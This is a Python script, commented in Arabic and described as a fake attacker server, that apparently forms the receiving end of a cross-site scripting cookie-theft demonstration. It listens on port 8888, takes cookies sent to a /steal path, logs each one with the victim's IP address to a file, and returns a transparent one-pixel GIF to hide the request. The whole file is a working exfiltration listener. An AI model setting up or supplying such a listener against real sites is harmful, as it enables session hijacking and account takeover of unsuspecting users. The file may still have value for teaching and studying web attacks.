#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
خادم وهمي للمهاجم
يستقبل الكوكي المسروق من الضحية.
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from datetime import datetime


class HackerHandler(BaseHTTPRequestHandler):
    """معالج الطلبات الواردة."""
    
    def do_GET(self):
        # تحليل الرابط
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        
        # إذا كان الطلب على /steal، فهذا يعني أن الكوكي وصل!
        if parsed.path == '/steal':
            cookie = params.get('c', [''])[0]
            
            print()
            print("=" * 60)
            print("🎯 تم استقبال كوكي مسروق!")
            print("=" * 60)
            print(f"⏰ الوقت: {datetime.now().strftime('%H:%M:%S')}")
            print(f"🌐 IP الضحية: {self.client_address[0]}")
            print(f"🍪 الكوكي: {cookie}")
            print("=" * 60)
            print()
            
            # حفظ الكوكي في ملف
            with open('stolen_cookies.txt', 'a', encoding='utf-8') as f:
                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] ")
                f.write(f"IP={self.client_address[0]} | Cookie={cookie}\n")
        
        # إرجاع رد (صورة وهمية في حالة طلب الصورة)
        self.send_response(200)
        self.send_header('Content-Type', 'image/gif')
        self.end_headers()
        # 1x1 صورة شفافة (لخداع المتصفح)
        self.wfile.write(b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00'
                        b'\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,'
                        b'\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x01D\x00;')
    
    def log_message(self, format, *args):
        """تعطيل السجلات الافتراضية (لتقليل الضوضاء)."""
        pass


def main():
    port = 8888
    server_address = ('', port)
    
    print("=" * 60)
    print("🎭 خادم المهاجم الوهمي")
    print("=" * 60)
    print(f"🚀 يعمل على المنفذ: {port}")
    print(f"🎯 يستقبل الكوكيز على: http://localhost:{port}/steal")
    print()
    print("⚠️  اترك هذا الخادم يعمل في نافذة منفصلة.")
    print("🛑 للإيقاف: Ctrl+C")
    print("=" * 60)
    print()
    
    server = HTTPServer(server_address, HackerHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n\n🛑 تم إيقاف الخادم.")
        server.server_close()


if __name__ == "__main__":
    main()